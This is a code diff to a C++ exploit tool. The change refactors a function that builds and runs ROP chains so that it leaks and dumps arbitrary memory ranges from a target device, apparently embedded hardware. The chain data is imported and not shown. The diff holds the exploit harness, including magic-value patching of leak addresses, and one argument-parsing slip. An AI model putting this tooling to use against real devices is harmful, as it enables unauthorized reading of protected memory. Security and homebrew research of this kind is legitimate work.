@@ -8,9 +8,8 @@
 #include <unistd.h>
 #include <vector>
 
-#include "args.hh"
+#include "args.h"
 #include "nvmem.hh"
-
 
 /* Import our ROP chains. */
 #define THUMB_BIT 1
@@ -34,9 +33,10 @@
 
 using namespace std;
 
-static void set_address_spaces(uint32_t *buf, size_t buf_size, uint32_t adr, uint32_t len)
+static void set_address_spaces(uint32_t *buf, uint32_t buf_len, 
+							uint32_t adr, uint32_t len)
 {
-	for (int i = 0; i < (buf_size / sizeof(uint32_t)); ++i) {
+	for (int i = 0; i < (buf_len / sizeof(uint32_t)); ++i) {
 		if (buf[i] == LEAK_DATA_ADDRESS_MAGIC)
 			buf[i] = adr;
 		if (buf[i] == LEAK_DATA_SIZE_MAGIC)
@@ -44,17 +44,9 @@ static void set_address_spaces(uint32_t *buf, size_t buf_size, uint32_t adr, uin
 	}
 }
 
-static uint8_t *get_dataleak_chain(uint32_t adr, uint32_t len, size_t &out_size)
+static uint8_t *get_dataleak_chain(std::string ver, uint32_t adr, uint32_t len, size_t &out_size)
 {
 	static std::vector<uint8_t> ropbuf;
-	std::string ver;
-
-	if (!fbool("--version","-V")) {
-		std::cerr << "Error: Missing expected parameter --version!" << std::endl;
-		return nullptr;
-	}
-
-	ver = fval("--version","-V", 1);
 	
 	const uint32_t *main_chain = nullptr; // ROP chain with the main payload.
 	const uint32_t *init_chain = nullptr; // ROP chain used to gain more stack space.
@@ -95,13 +87,24 @@ static uint8_t *get_dataleak_chain(uint32_t adr, uint32_t len, size_t &out_size)
 	return ropbuf.data();
 }
 
-int dump_memory_range(uint32_t addr, uint32_t len)
+int execute_rop_chain(enum rop_chain_type rop_type)
 {
+	std::string ver = fval("version", 1);
+	uint8_t* ropbuf = NULL;
 	size_t ropbuf_size;
-	uint8_t *ropbuf = get_dataleak_chain(addr, len, ropbuf_size);
+
+	if (rop_type == rop_chain_type::DATALEAK_CHAIN) {
+		uint32_t dump_addr, dump_len;
+		dump_addr = strtoul(fval("dump_addr", 1), nullptr, 0);
+		dump_len = strtoul(fval("dump_addr", 2), nullptr, 0);
+
+		printf("Dumping 0x%x - 0x%x to the console.\n", dump_addr, dump_len);
+
+		ropbuf = get_dataleak_chain(ver, dump_addr, dump_len, ropbuf_size);
+	};
 	
 	if (!ropbuf) {
-		std::cerr << "Error: Failed to get an ROP chain for the provided version." << std::endl;
+		std::cerr << "Error: Failed to get a ROP chain!!" << std::endl;
 		return -1;
 	}
 
